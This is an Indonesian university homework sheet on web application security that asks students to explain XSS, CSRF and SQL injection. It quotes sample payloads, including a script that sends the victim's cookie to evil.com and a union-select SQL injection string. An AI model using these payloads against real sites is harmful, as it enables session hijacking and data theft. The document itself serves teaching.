
Mata kuliah : Keamanan Jaringan Komputer<br>
Kelas : Teknik Informatika<br>
Fakultas Ilmu Komputer, Universitas Sriwijaya.<br>

#### SOAL:
##### Web Apps Vuln
1. Apakah yang dimaksud dengan celah pada aplikasi web (Web Apps Vulnerable)?
2. Jelaskan beberapa exploitasi yang dapat terjadi pada Web Apps!
3. Jelaskan maksud dari pesan HTTP pada paket data di bawah berikut!

```
GET /test/index.php HTTP/1.1
Host: 35.240.164.125
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://35.240.164.125/test/login.php
Connection: keep-alive
Cookie: security=low; PHPSESSID=p00u0h65mngqicaitmrnaimgk0
Upgrade-Insecure-Requests: 1
```

##### XSS
1. Jelaskan apa yang dimaksud dengan XSS attack, sebutkan ciri - ciri serangannya! Note *tambahan : berikan secara visual proses serangan tersebut
2. Pada serangan XSS atau Cross Site Scripting, terdapat script yang dapat dilakukan serangan, berikan penjelasan pada script xss attack injection berikut:

```
<script>alert(document.cookie)</script>
```

```
<script>document.write('<img src="http://evil.com/?'+document.cookie+'">');</script>
```

##### CSRF & SQL Injection
1. Jelaskan proses kerja dari serangan Cross-Site Request Forgery (CSRF). Note: *tambahan, berikan secara visual proses serangan tersebut
2. Jelaskan proses serangan pada SQL injection! Note: *tambahan, berikan secara visual proses serangan tersebut
3. Pada serangan SQL injection, beberapa payload yang di lakukan oleh attacker *di bawah. berikan penjelasan mengenai payload SQL Injection tersebut beserta dengan SQL query statement:

```
http://website-target.com/?id=%27+union+all+select+system_user%28%29%2Cuser%28%29+%23&Submit=Submit#
```

```
' union all select system_user(),user() #
```


#### NOTE: 
Kerjakan tugas berikut dengan seksama dan tulis dalam bentuk dokumen digital (.pdf). Soal tersedia dalam bentuk lampiran

Aturan:
- lihat batas tanggal pengumpulan tugas
- silahkan didownload dan kerjakan, kemudian upload berkas anda ke google classroom ini.
- untuk upload file tugas dengan format : nim[dot]pdf, <b>tidak dianjurkan dalam format doc, docx, karena dalam beberapa kasus, format nya berantakan ketika di baca menggunakan google doc</b>
- cantumkan referensi, website, buku.

<b>WARNING: tidak boleh plagiat, duplikasi dengan mahasiswa lainnya, misalkan jawaban sama, cuma berbeda Nama dan NIM, 
maka jika terjadi hal tersebut akan mendapatkan nilai 0 atau di kurangi</b>

